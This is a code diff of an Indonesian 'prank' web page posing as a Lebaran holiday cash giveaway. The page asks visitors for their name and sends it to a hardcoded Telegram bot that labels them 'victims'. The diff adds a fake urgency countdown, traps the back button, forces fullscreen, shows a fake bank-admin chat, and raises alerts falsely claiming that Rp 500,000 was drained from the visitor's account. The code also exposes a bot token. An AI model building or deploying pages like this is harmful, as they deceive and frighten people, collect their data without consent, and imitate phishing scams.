@@ -8,52 +8,59 @@
         body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
         #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
         h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
-        p { color: #166534; margin-top: 0; font-weight: bold; }
+        #timer-box { color: #dc2626; font-weight: bold; font-size: 0.9rem; margin-bottom: 10px; background: #fee2e2; padding: 5px 10px; border-radius: 20px; display: inline-block; }
+        
         #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
         input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
-        input:focus { border-color: #15803d; }
-        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; }
-        #envelope:active { transform: scale(0.9); }
         
+        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; }
+        
+        /* FAKE CHAT NOTIF (Fitur 9) */
+        #fake-chat { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 350px; background: white; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: flex; align-items: center; padding: 10px; transition: 0.5s; z-index: 200; }
+        #fake-chat.show { top: 20px; }
+        .chat-icon { width: 40px; height: 40px; background: #15803d; border-radius: 50%; margin-right: 10px; }
+        .chat-text { text-align: left; font-size: 0.8rem; color: #333; }
+        .chat-text b { color: #15803d; display: block; }
+
         /* PRANK SCREEN */
         #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; }
-        #prank-screen img { width: 100%; height: 100%; object-fit: contain; z-index: 1; }
+        #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
         #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; }
         
-        /* LOADING OVERLAY */
-        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 50; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
-        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; z-index: 10; }
-        #status-text { margin-top: 20px; font-weight: bold; color: #15803d; z-index: 10; }
-
+        /* LOADING */
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* ANIMASI DUIT & PARTIKEL */
-        .money { position: absolute; top: -50px; user-select: none; z-index: 1; animation: fall linear forwards; }
-        @keyframes fall { to { transform: translateY(105vh) rotate(360deg); } }
-        .particle { position: absolute; user-select: none; pointer-events: none; animation: popOut 2s linear forwards; }
-        @keyframes popOut {
-            0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
-            100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; }
-        }
+        .particle { position: absolute; animation: popOut 2s linear forwards; }
+        @keyframes popOut { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; } }
     </style>
 </head>
 <body>
 
+    <div id="fake-chat">
+        <div class="chat-icon"></div>
+        <div class="chat-text">
+            <b>Admin Bank Pusat</b>
+            <span id="chat-msg">Ngapain cari gratisan? Kerja woy!</span>
+        </div>
+    </div>
+
     <div id="intro">
-        <h1>Selamat Lebaran! 🌙</h1>
-        <p>Verifikasi nama Anda untuk pencairan dana THR.</p>
+        <h1>Dana Lebaran 8A 🌙</h1>
+        <div id="timer-box">⚠️ Sisa Kuota: <span id="countdown">02:59</span></div>
+        <p>Masukkan nama untuk klaim saldo Rp 500.000</p>
     </div>
 
     <div id="verify-box">
-        <input type="text" id="victim-name" placeholder="Nama Lengkap Sesuai E-Wallet" autocomplete="off">
+        <input type="text" id="victim-name" placeholder="Nama Lengkap" autocomplete="off">
     </div>
 
-    <img id="envelope" src="amplop.png" alt="Ambil THR">
+    <img id="envelope" src="amplop.png" alt="Ambil">
 
     <div id="loading-overlay">
-        <div id="money-container"></div>
         <div class="spinner"></div>
-        <p id="status-text">Menghubungkan ke server...</p>
+        <p id="status-text" style="font-weight:bold; margin-top:20px;">Menghubungkan...</p>
     </div>
 
     <div id="prank-screen" onclick="closePrank()">
@@ -63,86 +70,80 @@
 
     <script>
         const env = document.getElementById('envelope');
-        const nameInput = document.getElementById('victim-name');
-        const loading = document.getElementById('loading-overlay');
-        const statusText = document.getElementById('status-text');
         const prank = document.getElementById('prank-screen');
-        const moneyContainer = document.getElementById('money-container');
-        const particleContainer = document.getElementById('particle-container');
-        
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
-        prankSound.load();
-
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
-        const startTime = Date.now();
-        let loopPrank, moneyInterval;
+        let loopPrank;
 
-        function startMoneyRain() {
-            moneyInterval = setInterval(() => {
-                const money = document.createElement('div');
-                money.classList.add('money');
-                money.innerText = '💸';
-                money.style.left = Math.random() * 100 + 'vw';
-                money.style.animationDuration = '3s';
-                moneyContainer.appendChild(money);
-                setTimeout(() => money.remove(), 3000);
-            }, 150);
-        }
+        // Fitur 10: Logic Timer Palsu
+        let sec = 179;
+        setInterval(() => {
+            let m = Math.floor(sec/60);
+            let s = sec%60;
+            document.getElementById('countdown').innerText = `0${m}:${s<10?'0':''}${s}`;
+            if(sec > 10) sec--;
+        }, 1000);
 
-        function burstParticles() {
+        // Fitur 8: Anti-Back (Push state biar nggak bisa keluar gampang)
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, null, window.location.href);
+            if(prank.style.display === 'flex') {
+                prankSound.play(); // Malah bunyi kalau mau back
+                alert("MAU KEMANA BOS? SALDO LAGI DISEDOT!");
+            }
+        };
+
+        function burst() {
             for (let i = 0; i < 40; i++) {
                 const p = document.createElement('div');
-                p.classList.add('particle');
-                p.innerText = ['😂','🤣','🐒','🤡'][Math.floor(Math.random()*4)];
+                p.className = 'particle'; p.innerText = ['😂','🐒','🤣'][Math.floor(Math.random()*3)];
                 p.style.left = '50%'; p.style.top = '50%';
-                const angle = Math.random() * Math.PI * 2;
-                const speed = Math.random() * 350 + 100;
-                p.style.setProperty('--tx', Math.cos(angle)*speed+'px');
-                p.style.setProperty('--ty', Math.sin(angle)*speed+'px');
-                p.style.setProperty('--s', Math.random()*2+2);
+                const a = Math.random()*Math.PI*2; const s = Math.random()*350+100;
+                p.style.setProperty('--tx', Math.cos(a)*s+'px');
+                p.style.setProperty('--ty', Math.sin(a)*s+'px');
+                p.style.setProperty('--s', Math.random()*3+2);
                 p.style.setProperty('--r', Math.random()*720+'deg');
-                particleContainer.appendChild(p);
+                document.getElementById('particle-container').appendChild(p);
                 setTimeout(() => p.remove(), 2000);
             }
         }
 
         env.addEventListener('click', () => {
-            const nama = nameInput.value.trim();
-            if (nama === "") { alert("Isi nama dulu bos!"); return; }
-
-            prankSound.volume = 1.0;
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            const nama = document.getElementById('victim-name').value;
+            if(!nama) return alert("Isi nama!");
             
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent('🎯 KORBAN GAS: '+nama)}`, { mode: 'no-cors' });
-
-            loading.style.display = 'flex';
-            startMoneyRain();
-
-            setTimeout(() => statusText.innerText = "Verifikasi data " + nama + "...", 1500);
-            setTimeout(() => statusText.innerText = "Proses pencairan dana...", 3500);
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            document.getElementById('loading-overlay').style.display = 'flex';
+            
+            // Fitur 9: Fake Chat nongol pas loading
+            setTimeout(() => {
+                document.getElementById('fake-chat').classList.add('show');
+            }, 2000);
 
             setTimeout(() => {
-                clearInterval(moneyInterval);
-                loading.style.display = 'none';
+                document.getElementById('loading-overlay').style.display = 'none';
                 prank.style.display = 'flex';
-                
-                burstParticles();
-                loopPrank = setInterval(burstParticles, 2000);
-                
+                burst();
+                loopPrank = setInterval(burst, 2000);
                 prankSound.loop = true;
                 prankSound.play();
-                if (navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200, 1000]);
-            }, 5500);
+                
+                // Fitur 3: Pop-up Saldo Terkuras (Beruntun)
+                setTimeout(() => alert("⚠️ PERINGATAN: TERDETEKSI AKSES ILEGAL!"), 500);
+                setTimeout(() => alert("SALDO DANA ANDA SEDANG DIPINDAHKAN..."), 1500);
+                setTimeout(() => alert("BERHASIL MENGURAS Rp 500.000 DARI AKUN ANDA!"), 2500);
+                
+                fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=🎯 KORBAN KENA MENTAL: ${nama}`);
+            }, 5000);
         });
 
         function closePrank() {
             clearInterval(loopPrank);
             prank.style.display = 'none';
-            particleContainer.innerHTML = '';
             prankSound.pause();
-            prankSound.currentTime = 0;
-            if (document.exitFullscreen) document.exitFullscreen();
+            document.getElementById('fake-chat').classList.remove('show');
         }
     </script>
 </body>
